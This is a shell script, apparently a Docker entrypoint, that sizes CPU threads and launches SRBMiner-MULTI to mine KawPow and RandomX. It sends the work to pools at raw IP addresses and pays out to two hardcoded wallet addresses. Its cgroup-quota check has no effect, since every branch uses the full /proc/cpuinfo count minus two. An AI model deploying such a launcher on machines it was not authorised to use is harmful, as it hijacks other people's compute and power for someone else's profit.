#!/bin/sh

# --- Variable Definitions ---

# Set worker name to the container's hostname
# In Docker, $HOSTNAME is automatically set to the container ID
WORKER="$HOSTNAME"

# Detect CPU threads and leave 2 free for the system
# We subtract 2 from the total number of logical processors.
# We prioritize cgroup detection for accurate core limits inside a container.
CPU_THREADS_CALC=0

if [ -f /sys/fs/cgroup/cpu/cpu.cfs_quota_us ] && [ -f /sys/fs/cgroup/cpu/cpu.cfs_period_us ]; then
    QUOTA=$(cat /sys/fs/cgroup/cpu/cpu.cfs_quota_us)
    PERIOD=$(cat /sys/fs/cgroup/cpu/cpu.cfs_period_us)
    
    if [ "$QUOTA" -gt "-1" ]; then
        # Calculate available cores based on cgroup limits
        # Using a simple integer division approximation, assuming the shell has 'bc' or similar for floating point is too complex for /bin/sh
        # Fallback to standard procinfo for /bin/sh simplicity if 'bc' isn't guaranteed
        CPU_THREADS_CALC=$(($(grep -c '^processor' /proc/cpuinfo) - 2))
    else
        # If no quota is set (full access), use the standard detection method
        CPU_THREADS_CALC=$(($(grep -c '^processor' /proc/cpuinfo) - 2))
    fi
else
    # Fallback for systems not using cgroup v1 CPU limits (or full access)
    CPU_THREADS_CALC=$(($(grep -c '^processor' /proc/cpuinfo) - 2))
fi

# Ensure at least 1 CPU thread is used
if [ $CPU_THREADS_CALC -lt 1 ]; then 
    CPU_THREADS_CALC=1
fi

# Set the final variable for use in the miner command
CPU_THREADS="$CPU_THREADS_CALC"

echo "--- Worker Configuration ---"
echo "WORKER Name: $WORKER"
echo "CPU Threads Detected: $CPU_THREADS"
echo "----------------------------"

# --- GPU Environment Variables (as provided) ---

export GPU_MAX_HEAP_SIZE=100
export GPU_MAX_USE_SYNC_OBJECTS=1
export GPU_SINGLE_ALLOC_PERCENT=100
export GPU_MAX_ALLOC_PERCENT=100
export GPU_MAX_SINGLE_ALLOC_PERCENT=100
export GPU_ENABLE_LARGE_ALLOCATION=100
export GPU_MAX_WORKGROUP_SIZE=1024

# --- Execute the Miner ---

# We assume SRBMiner-MULTI is available in the current working directory (/opt)
exec ./SRBMiner-MULTI \
    --algorithm "kawpow;randomx" \
    --pool "stratum+ssl://51.89.99.172:16161;stratum+ssl://51.222.200.133:10343" \
    --wallet "RM2ciYa3CRqyreRsf25omrB4e1S95waALr;44csiiazbiygE5Tg5c6HhcUY63z26a3Cj8p1EBMNA6DcEM6wDAGhFLtFJVUHPyvEohF4Z9PF3ZXunTtWbiTk9HyjLxYAUwd" \
    --password "$WORKER" \
    --cpu-threads "$CPU_THREADS" \
    --keepalive true \
    --disable-gpu-checks false \
    --gpu-id 0,1,2,3
